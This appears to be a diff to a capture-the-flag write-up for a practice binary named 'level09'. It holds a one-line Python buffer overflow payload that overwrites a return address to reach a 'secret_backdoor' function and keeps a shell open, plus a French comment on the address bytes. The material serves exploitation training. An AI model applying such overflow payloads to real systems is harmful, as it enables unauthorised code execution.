@@ -1,7 +1,8 @@
-(gdb) b secret_backdoor 
-Breakpoint 1 at 0x555555554890
+find secret_backdoor address 
 
 (python -c 'print("A" * 40 + "\xca" + "\x8c\x48" * 146)') | ./level09
+
+\x8c\x48 sont les deux derniers octets
 
 ```sh
 $ (python -c 'print("A" * 40 + "\xca" + "\x8c\x48" * 146)'; cat) | ./level09
